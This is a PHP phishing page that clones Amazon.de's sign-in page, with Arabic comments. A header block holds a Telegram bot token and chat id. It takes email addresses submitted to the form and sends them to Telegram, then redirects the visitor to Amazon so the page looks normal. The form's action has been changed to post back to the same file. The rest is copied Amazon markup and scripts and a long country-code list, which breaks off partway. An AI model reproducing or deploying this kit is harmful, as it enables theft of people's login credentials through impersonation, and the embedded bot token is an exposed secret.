<?php
// ============================================================
// إعدادات بوت تيليغرام - قم بتعديل هذه القيم
// ============================================================
$bot_token = '8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk';  // ضع التوكن الخاص بك هنا
$chat_id   = '-1003788054267';    // ضع معرف الدردشة هنا
// ============================================================

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = trim($_POST['email']);
    if (!empty($email)) {
        // رسالة سيتم إرسالها إلى التيليغرام
        $message = "📧 New email from Amazon login page:\n" . $email;
        
        // إرسال عبر API التيليغرام
        ...
        // بعد الإرسال، يمكن إعادة التوجيه إلى أمازون لتبدو الصفحة طبيعية
...
var ue_id = 'S269M0NWDV8F4BPWKWH6',
    ue_url = '/rd/uedata',
    ue_drfp = true,
    ue_navtiming = 1,
    ue_mid = 'A1PA6795UKMFR9',
    ue_sid = '260-5731645-2088301',
    ue_sn = 'www.amazon.de',
    ue_furl = 'fls-eu.amazon.de',
    ue_surl = 'https://unagi.amazon.de/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-eu.amazon.de/1/batch/1/OP/A1PA6795UKMFR9:260-5731645-2088301:S269M0NWDV8F4BPWKWH6$uedata=s:',
    ue_sbuimp = 1,
    ue_ibft = 0,
    ue_lpsi = 6000,
    ue_lob = '1',
...
<!-- a0j07fz5c6zty7e23reiw9mp2oe0lj3folmoatrdo -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 10718)</script>
...
"@c/"),x=-1<g.indexOf("/")?g.split("/")[0]:g,l=c?b.P._namespace(c):b.P;a=!g.lastIndexOf("@c/",0);c=!g.lastIndexOf("@m/",0);for(var q=[],u=[],p=[],v=[],n=-1,m=-1,k=0;k<e.length;k++){var f=e[k];"module"===f&&l.error("C002");"exports"===f?m=k:"require"===f?n=k:f.lastIndexOf("@p/",0)?f.lastIndexOf("@c/",0)&&f.lastIndexOf("@m/",0)?f.lastIndexOf("./",0)?(q.push(k),u.push("mix:"+f)):(p.push(k),v.push(f)):(p.push(k),v.push(f)):(q.push(k),u.push(f.substr(3)))}var y=a||c||r||~n||p.length;
...
<script src="https://m.media-amazon.com/images/I/11J1WJh9jNL.js?AUIClients/PRIVCONAssets-stub" crossorigin="anonymous"></script>
...
<body class="a-m-de a-aui_72554-c a-aui_template_weblab_cache_333406-c"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_72554":"C","AUI_TEMPLATE_WEBLAB_CACHE_333406":"C"}</script><script>typeof uex === 'function' && uex('ld', 'portal-bb', {wb: 1})</script><!-- sp:end-feature:start-body -->
...
if (window.csa) {
    csa("Config", {
        'Application': 'Retail:Prod:www.amazon.de',
        ...
        'CacheDetection.RequestID': "S269M0NWDV8F4BPWKWH6",
    ...
    csa("Events")("setEntity", {
        page: {requestId: "S269M0NWDV8F4BPWKWH6", meaningful: "interactive"},
        session: {id: "260-5731645-2088301"}
    });
}
...
window.rx = { 'rid':'S269M0NWDV8F4BPWKWH6', 'sid':'260-5731645-2088301', 'c':{  'rxp':'/rd/uedata',  'ml_dl':false }};
</script>
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 20453)</script>
...
b!=C||(g+=a._ui());g+="&lob="+(d.ue_lob||"0");a.a=g;v(g,l,y,m,b&&"string"===typeof b&&-1!==b.indexOf("csa:"));m||(u.lob=d.ue_lob||"0",u.browserData=g,(b=t&&t("UEData"))&&b("log",u))}}function ha(a){var b=k.ue_csm_markers||{},c;for(c in b)b[x](c)&&F(c,a,A,b[c])}function D(a,b,c){c=c||k;if(c[$])c[$](a,b,!1);else if(c[aa])c[aa]("on"+a,b)}function Y(a,b,c){c=c||k;if(c[ba])c[ba](a,b,!1);else if(c[ca])c[ca]("on"+a,b)}function da(){function a(){d.onUl()}function b(a){return function(){c[a]||(c[a]=1,W(a))}}
var c={},e,f;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");e={stop:b("os")};k.chrome?(D(L,a),P.push(a)):e[L]=d.onUl;for(f in e)e[x](f)&&V(0,k,f,e[f]);d.ue_viz&&ue_viz();D("load",d.onLd);F("ue")}function ga(e,b,c,f,p){var v=d.ue_mbl,r=k.csa,m=r&&r("SPA"),r=r&&r("PageTiming");v&&v.ajax&&v.ajax(b,c);m&&r&&(e={requestId:e,transitionType:"soft"},"string"===typeof f&&(e.pageType=f,d.ue_pty=f),"string"===typeof p&&(e.subPageType=p,d.ue_spty=p),m("newPage",e),r("mark","transitionStart",b));a.tag("ajax-transition")}
d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.348528.0";a.paused=!1;var x="hasOwnProperty",L="beforeunload",O="on"+L,$="addEventListener",ba="removeEventListener",aa="attachEvent",ca="detachEvent",X={cf:"criticalFeature",af:"aboveTheFold",fn:"functional",fp:"firstPaint",fcp:"firstContentfulPaint",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},K=k.Date,H=k.performance||
k.webkitPerformance,f=(H||{}).timing,E=(H||{}).navigation,Q=(f||{}).navigationStart,p=d.ue_fpf,U=0,Z=0,P=[],J=0,A;a.oid=I(a.id);a.lid=I(a.id);a._t0=a.t0;a.tag=T();a.ifr=k.top!==k.self||k.frameElement?1:0;a.markers=null;a.attach=D;a.detach=Y;if("000-0000000-8675309"===d.ue_sid){var ea=N("cdn-rid"),fa=N("session-id");ea&&fa&&S(ea,fa,"cdn")}d.uei=da;d.ueh=V;d.ues=e;d.uet=F;d.uex=W;a.reset=S;a.pause=function(d){a.paused=d};da()})(ue_csm,ue_csm.window,ue_csm.document);
...
<!-- 6thd62mhhgn1oglypxz0siu -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 10659)</script>
...
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 22651)</script>
...
<script>
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/51v99V0OPwL.js?AUIClients/AuthXClaimCollectionUIAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/817Rx5CtL0L.js?AUIClients/FWCIMAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/71Qaw9oemHL.js?AUIClients/IdentityWebAuthnAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/51weYE2Sc0L.js?AUIClients/IdentityJsCommonAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/41pfFoFRPfL.js?AUIClients/AuthXSharedUIAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://m.media-amazon.com/images/I/610N5OiBmgL.js?AUIClients/IdentityNavigationNativeAssets');
</script>



<script type="a-state" data-a-state="{&quot;key&quot;:&quot;unified-auth-autofill-credential-state&quot;}">{"isPasswordAutoFillEnabled":false,"isPrepopulateEnabled":true}</script>
...
<!-- Panther string bundle -->
  ...
  <span class="a-declarative" data-action="submit-claim" data-submit-claim="{}">
    <!-- تم تعديل action ليكون نفس الملف (فارغ) -->
    <form id="ap_login_form" name="signIn" method="post" novalidate action="">
      ...
      <input type="hidden" name="isServerSideRouting" value="true"/>
        ...
        <input type="hidden" name="unifiedAuthTreatment" value="T2"/>
...
<!-- Fill in WebAuthN context if available -->

  <input type="hidden" name="webAuthnGetArbForAutofill" value="2ef4ae0b-fcd5-473d-8bbf-1ca3e07d90f3"/>



  <input type="hidden" name="webAuthnGetParametersForAutofill" value="eyJycElkIjoiYW1hem9uLmRlIiwiY2hhbGxlbmdlIjoiN3JvT1dOZUtkYWNXdDJqckc3TG1CWDJzNTRFLS0xSjMiLCJ0aW1lb3V0Ijo5MDAwMDAsIm1lZGlhdGlvbiI6ImNvbmRpdGlvbmFsIiwidXNlclZlcmlmaWNhdGlvbiI6InByZWZlcnJlZCJ9"/>



  <input type="hidden" name="webAuthnChallengeIdForAutofill" value="7roOWNeKdacWt2jrG7LmBX2s54E--1J3:EU"/>
  ...
  <input type="hidden" name="openid.return_to" value="https://www.amazon.de/?ref_=nav_signin"/>



  <input type="hidden" name="openid.assoc_handle" value="deflex"/>
  ...
  <input type="hidden" name="signalUnknownCredentialUnifiedAuthWeblabActive" value="false"/>


      <!-- Append the CSRF token (value generated by Horizonte) -->
      <!-- For more info, see https://skb.highcastle.a2z.com/implementations/8 -->
      <input type='hidden' name='anti-csrftoken-a2z' value='hGqMGrwWAeBXT40eO62J/kOMd/jmuCew4kY+CPX5rG9HAAAAAGomuJ8AAAAB' />

      
      <script type="a-state" data-a-state="{&quot;key&quot;:&quot;mobileSDCConfigMap&quot;}">{"mobileSDCConfigKey":""}</script>
...
<!-- Claim-collection input container (text input with dropdown ) -->
...
<!-- id="claim-input-dropdown" will be placed on the JavaScript enabled drop-down button -->
<!-- nativeId="claim-input-dropdown-select-element" will be placed on the HTML select tag which is output by the template -->
<span class="a-dropdown-container"><select name="" autocomplete="off" role="combobox" data-a-native-class="aok-hidden" data-a-touch-header="Country/region code" id="claim-input-dropdown-select-element" tabindex="0" data-action="a-dropdown-select" class="a-native-dropdown a-declarative aok-hidden">
        ...
        <option data-calling-code="93" value="AF" data-a-html-content="Afghanistan &lt;span dir=&quot;ltr&quot;&gt;+93&lt;/span&gt;">
            AF +93
        </option>
    
        
        <option data-calling-code="355" value="AL" data-a-html-content="Albania &lt;span dir=&quot;ltr&quot;&gt;+355&lt;/span&gt;">
            AL +355
        </option>
    
        
        <option data-calling-code="213" value="DZ" data-a-html-content="Algeria &lt;span dir=&quot;ltr&quot;&gt;+213&lt;/span&gt;">
            DZ +213
        </option>
    
        
        <option data-calling-code="1" value="AS" data-a-html-content="American Samoa &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            AS +1
        </option>
    
        
        <option data-calling-code="376" value="AD" data-a-html-content="Andorra &lt;span dir=&quot;ltr&quot;&gt;+376&lt;/span&gt;">
            AD +376
        </option>
    
        
        <option data-calling-code="244" value="AO" data-a-html-content="Angola &lt;span dir=&quot;ltr&quot;&gt;+244&lt;/span&gt;">
            AO +244
        </option>
    
        
        <option data-calling-code="1" value="AI" data-a-html-content="Anguilla &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            AI +1
        </option>
    
        
        <option data-calling-code="0" value="AQ" data-a-html-content="Antarctica &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            AQ +0
        </option>
    
        
        <option data-calling-code="1" value="AG" data-a-html-content="Antigua &amp; Barbuda &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            AG +1
        </option>
    
        
        <option data-calling-code="54" value="AR" data-a-html-content="Argentina &lt;span dir=&quot;ltr&quot;&gt;+54&lt;/span&gt;">
            AR +54
        </option>
    
        
        <option data-calling-code="374" value="AM" data-a-html-content="Armenia &lt;span dir=&quot;ltr&quot;&gt;+374&lt;/span&gt;">
            AM +374
        </option>
    
        
        <option data-calling-code="297" value="AW" data-a-html-content="Aruba &lt;span dir=&quot;ltr&quot;&gt;+297&lt;/span&gt;">
            AW +297
        </option>
    
        
        <option data-calling-code="247" value="AC" data-a-html-content="Ascension Island &lt;span dir=&quot;ltr&quot;&gt;+247&lt;/span&gt;">
            AC +247
        </option>
    
        
        <option data-calling-code="61" value="AU" data-a-html-content="Australia &lt;span dir=&quot;ltr&quot;&gt;+61&lt;/span&gt;">
            AU +61
        </option>
    
        
        <option data-calling-code="43" value="AT" data-a-html-content="Austria &lt;span dir=&quot;ltr&quot;&gt;+43&lt;/span&gt;">
            AT +43
        </option>
    
        
        <option data-calling-code="994" value="AZ" data-a-html-content="Azerbaijan &lt;span dir=&quot;ltr&quot;&gt;+994&lt;/span&gt;">
            AZ +994
        </option>
    
        
        <option data-calling-code="1" value="BS" data-a-html-content="Bahamas &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            BS +1
        </option>
    
        
        <option data-calling-code="973" value="BH" data-a-html-content="Bahrain &lt;span dir=&quot;ltr&quot;&gt;+973&lt;/span&gt;">
            BH +973
        </option>
    
        
        <option data-calling-code="880" value="BD" data-a-html-content="Bangladesh &lt;span dir=&quot;ltr&quot;&gt;+880&lt;/span&gt;">
            BD +880
        </option>
    
        
        <option data-calling-code="1" value="BB" data-a-html-content="Barbados &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            BB +1
        </option>
    
        
        <option data-calling-code="375" value="BY" data-a-html-content="Belarus &lt;span dir=&quot;ltr&quot;&gt;+375&lt;/span&gt;">
            BY +375
        </option>
    
        
        <option data-calling-code="32" value="BE" data-a-html-content="Belgium &lt;span dir=&quot;ltr&quot;&gt;+32&lt;/span&gt;">
            BE +32
        </option>
    
        
        <option data-calling-code="501" value="BZ" data-a-html-content="Belize &lt;span dir=&quot;ltr&quot;&gt;+501&lt;/span&gt;">
            BZ +501
        </option>
    
        
        <option data-calling-code="229" value="BJ" data-a-html-content="Benin &lt;span dir=&quot;ltr&quot;&gt;+229&lt;/span&gt;">
            BJ +229
        </option>
    
        
        <option data-calling-code="1" value="BM" data-a-html-content="Bermuda &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            BM +1
        </option>
    
        
        <option data-calling-code="975" value="BT" data-a-html-content="Bhutan &lt;span dir=&quot;ltr&quot;&gt;+975&lt;/span&gt;">
            BT +975
        </option>
    
        
        <option data-calling-code="591" value="BO" data-a-html-content="Bolivia &lt;span dir=&quot;ltr&quot;&gt;+591&lt;/span&gt;">
            BO +591
        </option>
    
        
        <option data-calling-code="387" value="BA" data-a-html-content="Bosnia &amp; Herzegovina &lt;span dir=&quot;ltr&quot;&gt;+387&lt;/span&gt;">
            BA +387
        </option>
    
        
        <option data-calling-code="267" value="BW" data-a-html-content="Botswana &lt;span dir=&quot;ltr&quot;&gt;+267&lt;/span&gt;">
            BW +267
        </option>
    
        
        <option data-calling-code="0" value="BV" data-a-html-content="Bouvet Island &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            BV +0
        </option>
    
        
        <option data-calling-code="55" value="BR" data-a-html-content="Brazil &lt;span dir=&quot;ltr&quot;&gt;+55&lt;/span&gt;">
            BR +55
        </option>
    
        
        <option data-calling-code="246" value="IO" data-a-html-content="British Indian Ocean Territory &lt;span dir=&quot;ltr&quot;&gt;+246&lt;/span&gt;">
            IO +246
        </option>
    
        
        <option data-calling-code="1" value="VG" data-a-html-content="British Virgin Islands &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            VG +1
        </option>
    
        
        <option data-calling-code="673" value="BN" data-a-html-content="Brunei &lt;span dir=&quot;ltr&quot;&gt;+673&lt;/span&gt;">
            BN +673
        </option>
    
        
        <option data-calling-code="359" value="BG" data-a-html-content="Bulgaria &lt;span dir=&quot;ltr&quot;&gt;+359&lt;/span&gt;">
            BG +359
        </option>
    
        
        <option data-calling-code="226" value="BF" data-a-html-content="Burkina Faso &lt;span dir=&quot;ltr&quot;&gt;+226&lt;/span&gt;">
            BF +226
        </option>
    
        
        <option data-calling-code="257" value="BI" data-a-html-content="Burundi &lt;span dir=&quot;ltr&quot;&gt;+257&lt;/span&gt;">
            BI +257
        </option>
    
        
        <option data-calling-code="855" value="KH" data-a-html-content="Cambodia &lt;span dir=&quot;ltr&quot;&gt;+855&lt;/span&gt;">
            KH +855
        </option>
    
        
        <option data-calling-code="237" value="CM" data-a-html-content="Cameroon &lt;span dir=&quot;ltr&quot;&gt;+237&lt;/span&gt;">
            CM +237
        </option>
    
        
        <option data-calling-code="1" value="CA" data-a-html-content="Canada &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            CA +1
        </option>
    
        
        <option data-calling-code="0" value="IC" data-a-html-content="Canary Islands &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            IC +0
        </option>
    
        
        <option data-calling-code="238" value="CV" data-a-html-content="Cape Verde &lt;span dir=&quot;ltr&quot;&gt;+238&lt;/span&gt;">
            CV +238
        </option>
    
        
        <option data-calling-code="599" value="BQ" data-a-html-content="Caribbean Netherlands &lt;span dir=&quot;ltr&quot;&gt;+599&lt;/span&gt;">
            BQ +599
        </option>
    
        
        <option data-calling-code="1" value="KY" data-a-html-content="Cayman Islands &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            KY +1
        </option>
    
        
        <option data-calling-code="236" value="CF" data-a-html-content="Central African Republic &lt;span dir=&quot;ltr&quot;&gt;+236&lt;/span&gt;">
            CF +236
        </option>
    
        
        <option data-calling-code="0" value="EA" data-a-html-content="Ceuta &amp; Melilla &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            EA +0
        </option>
    
        
        <option data-calling-code="235" value="TD" data-a-html-content="Chad &lt;span dir=&quot;ltr&quot;&gt;+235&lt;/span&gt;">
            TD +235
        </option>
    
        
        <option data-calling-code="56" value="CL" data-a-html-content="Chile &lt;span dir=&quot;ltr&quot;&gt;+56&lt;/span&gt;">
            CL +56
        </option>
    
        
        <option data-calling-code="86" value="CN" data-a-html-content="China &lt;span dir=&quot;ltr&quot;&gt;+86&lt;/span&gt;">
            CN +86
        </option>
    
        
        <option data-calling-code="61" value="CX" data-a-html-content="Christmas Island &lt;span dir=&quot;ltr&quot;&gt;+61&lt;/span&gt;">
            CX +61
        </option>
    
        
        <option data-calling-code="0" value="CP" data-a-html-content="Clipperton Island &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            CP +0
        </option>
    
        
        <option data-calling-code="61" value="CC" data-a-html-content="Cocos (Keeling) Islands &lt;span dir=&quot;ltr&quot;&gt;+61&lt;/span&gt;">
            CC +61
        </option>
    
        
        <option data-calling-code="57" value="CO" data-a-html-content="Colombia &lt;span dir=&quot;ltr&quot;&gt;+57&lt;/span&gt;">
            CO +57
        </option>
    
        
        <option data-calling-code="269" value="KM" data-a-html-content="Comoros &lt;span dir=&quot;ltr&quot;&gt;+269&lt;/span&gt;">
            KM +269
        </option>
    
        
        <option data-calling-code="242" value="CG" data-a-html-content="Congo - Brazzaville &lt;span dir=&quot;ltr&quot;&gt;+242&lt;/span&gt;">
            CG +242
        </option>
    
        
        <option data-calling-code="243" value="CD" data-a-html-content="Congo - Kinshasa &lt;span dir=&quot;ltr&quot;&gt;+243&lt;/span&gt;">
            CD +243
        </option>
    
        
        <option data-calling-code="682" value="CK" data-a-html-content="Cook Islands &lt;span dir=&quot;ltr&quot;&gt;+682&lt;/span&gt;">
            CK +682
        </option>
    
        
        <option data-calling-code="506" value="CR" data-a-html-content="Costa Rica &lt;span dir=&quot;ltr&quot;&gt;+506&lt;/span&gt;">
            CR +506
        </option>
    
        
        <option data-calling-code="385" value="HR" data-a-html-content="Croatia &lt;span dir=&quot;ltr&quot;&gt;+385&lt;/span&gt;">
            HR +385
        </option>
    
        
        <option data-calling-code="53" value="CU" data-a-html-content="Cuba &lt;span dir=&quot;ltr&quot;&gt;+53&lt;/span&gt;">
            CU +53
        </option>
    
        
        <option data-calling-code="599" value="CW" data-a-html-content="Curaçao &lt;span dir=&quot;ltr&quot;&gt;+599&lt;/span&gt;">
            CW +599
        </option>
    
        
        <option data-calling-code="357" value="CY" data-a-html-content="Cyprus &lt;span dir=&quot;ltr&quot;&gt;+357&lt;/span&gt;">
            CY +357
        </option>
    
        
        <option data-calling-code="420" value="CZ" data-a-html-content="Czechia &lt;span dir=&quot;ltr&quot;&gt;+420&lt;/span&gt;">
            CZ +420
        </option>
    
        
        <option data-calling-code="225" value="CI" data-a-html-content="Côte d’Ivoire &lt;span dir=&quot;ltr&quot;&gt;+225&lt;/span&gt;">
            CI +225
        </option>
    
        
        <option data-calling-code="45" value="DK" data-a-html-content="Denmark &lt;span dir=&quot;ltr&quot;&gt;+45&lt;/span&gt;">
            DK +45
        </option>
    
        
        <option data-calling-code="0" value="DG" data-a-html-content="Diego Garcia &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            DG +0
        </option>
    
        
        <option data-calling-code="253" value="DJ" data-a-html-content="Djibouti &lt;span dir=&quot;ltr&quot;&gt;+253&lt;/span&gt;">
            DJ +253
        </option>
    
        
        <option data-calling-code="1" value="DM" data-a-html-content="Dominica &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            DM +1
        </option>
    
        
        <option data-calling-code="1" value="DO" data-a-html-content="Dominican Republic &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            DO +1
        </option>
    
        
        <option data-calling-code="593" value="EC" data-a-html-content="Ecuador &lt;span dir=&quot;ltr&quot;&gt;+593&lt;/span&gt;">
            EC +593
        </option>
    
        
        <option data-calling-code="20" value="EG" data-a-html-content="Egypt &lt;span dir=&quot;ltr&quot;&gt;+20&lt;/span&gt;">
            EG +20
        </option>
    
        
        <option data-calling-code="503" value="SV" data-a-html-content="El Salvador &lt;span dir=&quot;ltr&quot;&gt;+503&lt;/span&gt;">
            SV +503
        </option>
    
        
        <option data-calling-code="240" value="GQ" data-a-html-content="Equatorial Guinea &lt;span dir=&quot;ltr&quot;&gt;+240&lt;/span&gt;">
            GQ +240
        </option>
    
        
        <option data-calling-code="291" value="ER" data-a-html-content="Eritrea &lt;span dir=&quot;ltr&quot;&gt;+291&lt;/span&gt;">
            ER +291
        </option>
    
        
        <option data-calling-code="372" value="EE" data-a-html-content="Estonia &lt;span dir=&quot;ltr&quot;&gt;+372&lt;/span&gt;">
            EE +372
        </option>
    
        
        <option data-calling-code="268" value="SZ" data-a-html-content="Eswatini &lt;span dir=&quot;ltr&quot;&gt;+268&lt;/span&gt;">
            SZ +268
        </option>
    
        
        <option data-calling-code="251" value="ET" data-a-html-content="Ethiopia &lt;span dir=&quot;ltr&quot;&gt;+251&lt;/span&gt;">
            ET +251
        </option>
    
        
        <option data-calling-code="500" value="FK" data-a-html-content="Falkland Islands &lt;span dir=&quot;ltr&quot;&gt;+500&lt;/span&gt;">
            FK +500
        </option>
    
        
        <option data-calling-code="298" value="FO" data-a-html-content="Faroe Islands &lt;span dir=&quot;ltr&quot;&gt;+298&lt;/span&gt;">
            FO +298
        </option>
    
        
        <option data-calling-code="679" value="FJ" data-a-html-content="Fiji &lt;span dir=&quot;ltr&quot;&gt;+679&lt;/span&gt;">
            FJ +679
        </option>
    
        
        <option data-calling-code="358" value="FI" data-a-html-content="Finland &lt;span dir=&quot;ltr&quot;&gt;+358&lt;/span&gt;">
            FI +358
        </option>
    
        
        <option data-calling-code="33" value="FR" data-a-html-content="France &lt;span dir=&quot;ltr&quot;&gt;+33&lt;/span&gt;">
            FR +33
        </option>
    
        
        <option data-calling-code="594" value="GF" data-a-html-content="French Guiana &lt;span dir=&quot;ltr&quot;&gt;+594&lt;/span&gt;">
            GF +594
        </option>
    
        
        <option data-calling-code="689" value="PF" data-a-html-content="French Polynesia &lt;span dir=&quot;ltr&quot;&gt;+689&lt;/span&gt;">
            PF +689
        </option>
    
        
        <option data-calling-code="0" value="TF" data-a-html-content="French Southern Territories &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            TF +0
        </option>
    
        
        <option data-calling-code="241" value="GA" data-a-html-content="Gabon &lt;span dir=&quot;ltr&quot;&gt;+241&lt;/span&gt;">
            GA +241
        </option>
    
        
        <option data-calling-code="220" value="GM" data-a-html-content="Gambia &lt;span dir=&quot;ltr&quot;&gt;+220&lt;/span&gt;">
            GM +220
        </option>
    
        
        <option data-calling-code="995" value="GE" data-a-html-content="Georgia &lt;span dir=&quot;ltr&quot;&gt;+995&lt;/span&gt;">
            GE +995
        </option>
        ...
        <option data-calling-code="233" value="GH" data-a-html-content="Ghana &lt;span dir=&quot;ltr&quot;&gt;+233&lt;/span&gt;">
            GH +233
        </option>
    
        
        <option data-calling-code="350" value="GI" data-a-html-content="Gibraltar &lt;span dir=&quot;ltr&quot;&gt;+350&lt;/span&gt;">
            GI +350
        </option>
    
        
        <option data-calling-code="30" value="GR" data-a-html-content="Greece &lt;span dir=&quot;ltr&quot;&gt;+30&lt;/span&gt;">
            GR +30
        </option>
    
        
        <option data-calling-code="299" value="GL" data-a-html-content="Greenland &lt;span dir=&quot;ltr&quot;&gt;+299&lt;/span&gt;">
            GL +299
        </option>
    
        
        <option data-calling-code="1" value="GD" data-a-html-content="Grenada &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            GD +1
        </option>
    
        
        <option data-calling-code="590" value="GP" data-a-html-content="Guadeloupe &lt;span dir=&quot;ltr&quot;&gt;+590&lt;/span&gt;">
            GP +590
        </option>
    
        
        <option data-calling-code="1" value="GU" data-a-html-content="Guam &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            GU +1
        </option>
    
        
        <option data-calling-code="502" value="GT" data-a-html-content="Guatemala &lt;span dir=&quot;ltr&quot;&gt;+502&lt;/span&gt;">
            GT +502
        </option>
    
        
        <option data-calling-code="44" value="GG" data-a-html-content="Guernsey &lt;span dir=&quot;ltr&quot;&gt;+44&lt;/span&gt;">
            GG +44
        </option>
    
        
        <option data-calling-code="224" value="GN" data-a-html-content="Guinea &lt;span dir=&quot;ltr&quot;&gt;+224&lt;/span&gt;">
            GN +224
        </option>
    
        
        <option data-calling-code="245" value="GW" data-a-html-content="Guinea-Bissau &lt;span dir=&quot;ltr&quot;&gt;+245&lt;/span&gt;">
            GW +245
        </option>
    
        
        <option data-calling-code="592" value="GY" data-a-html-content="Guyana &lt;span dir=&quot;ltr&quot;&gt;+592&lt;/span&gt;">
            GY +592
        </option>
    
        
        <option data-calling-code="509" value="HT" data-a-html-content="Haiti &lt;span dir=&quot;ltr&quot;&gt;+509&lt;/span&gt;">
            HT +509
        </option>
    
        
        <option data-calling-code="0" value="HM" data-a-html-content="Heard &amp; McDonald Islands &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            HM +0
        </option>
    
        
        <option data-calling-code="504" value="HN" data-a-html-content="Honduras &lt;span dir=&quot;ltr&quot;&gt;+504&lt;/span&gt;">
            HN +504
        </option>
    
        
        <option data-calling-code="852" value="HK" data-a-html-content="Hong Kong &lt;span dir=&quot;ltr&quot;&gt;+852&lt;/span&gt;">
            HK +852
        </option>
    
        
        <option data-calling-code="36" value="HU" data-a-html-content="Hungary &lt;span dir=&quot;ltr&quot;&gt;+36&lt;/span&gt;">
            HU +36
        </option>
    
        
        <option data-calling-code="354" value="IS" data-a-html-content="Iceland &lt;span dir=&quot;ltr&quot;&gt;+354&lt;/span&gt;">
            IS +354
        </option>
    
        
        <option data-calling-code="91" value="IN" data-a-html-content="India &lt;span dir=&quot;ltr&quot;&gt;+91&lt;/span&gt;">
            IN +91
        </option>
    
        
        <option data-calling-code="62" value="ID" data-a-html-content="Indonesia &lt;span dir=&quot;ltr&quot;&gt;+62&lt;/span&gt;">
            ID +62
        </option>
    
        
        <option data-calling-code="98" value="IR" data-a-html-content="Iran &lt;span dir=&quot;ltr&quot;&gt;+98&lt;/span&gt;">
            IR +98
        </option>
    
        
        <option data-calling-code="964" value="IQ" data-a-html-content="Iraq &lt;span dir=&quot;ltr&quot;&gt;+964&lt;/span&gt;">
            IQ +964
        </option>
    
        
        <option data-calling-code="353" value="IE" data-a-html-content="Ireland &lt;span dir=&quot;ltr&quot;&gt;+353&lt;/span&gt;">
            IE +353
        </option>
    
        
        <option data-calling-code="44" value="IM" data-a-html-content="Isle of Man &lt;span dir=&quot;ltr&quot;&gt;+44&lt;/span&gt;">
            IM +44
        </option>
    
        
        <option data-calling-code="972" value="IL" data-a-html-content="Israel &lt;span dir=&quot;ltr&quot;&gt;+972&lt;/span&gt;">
            IL +972
        </option>
    
        
        <option data-calling-code="39" value="IT" data-a-html-content="Italy &lt;span dir=&quot;ltr&quot;&gt;+39&lt;/span&gt;">
            IT +39
        </option>
    
        
        <option data-calling-code="1" value="JM" data-a-html-content="Jamaica &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            JM +1
        </option>
    
        
        <option data-calling-code="81" value="JP" data-a-html-content="Japan &lt;span dir=&quot;ltr&quot;&gt;+81&lt;/span&gt;">
            JP +81
        </option>
    
        
        <option data-calling-code="44" value="JE" data-a-html-content="Jersey &lt;span dir=&quot;ltr&quot;&gt;+44&lt;/span&gt;">
            JE +44
        </option>
    
        
        <option data-calling-code="962" value="JO" data-a-html-content="Jordan &lt;span dir=&quot;ltr&quot;&gt;+962&lt;/span&gt;">
            JO +962
        </option>
    
        
        <option data-calling-code="7" value="KZ" data-a-html-content="Kazakhstan &lt;span dir=&quot;ltr&quot;&gt;+7&lt;/span&gt;">
            KZ +7
        </option>
    
        
        <option data-calling-code="254" value="KE" data-a-html-content="Kenya &lt;span dir=&quot;ltr&quot;&gt;+254&lt;/span&gt;">
            KE +254
        </option>
    
        
        <option data-calling-code="686" value="KI" data-a-html-content="Kiribati &lt;span dir=&quot;ltr&quot;&gt;+686&lt;/span&gt;">
            KI +686
        </option>
    
        
        <option data-calling-code="383" value="XK" data-a-html-content="Kosovo &lt;span dir=&quot;ltr&quot;&gt;+383&lt;/span&gt;">
            XK +383
        </option>
    
        
        <option data-calling-code="965" value="KW" data-a-html-content="Kuwait &lt;span dir=&quot;ltr&quot;&gt;+965&lt;/span&gt;">
            KW +965
        </option>
    
        
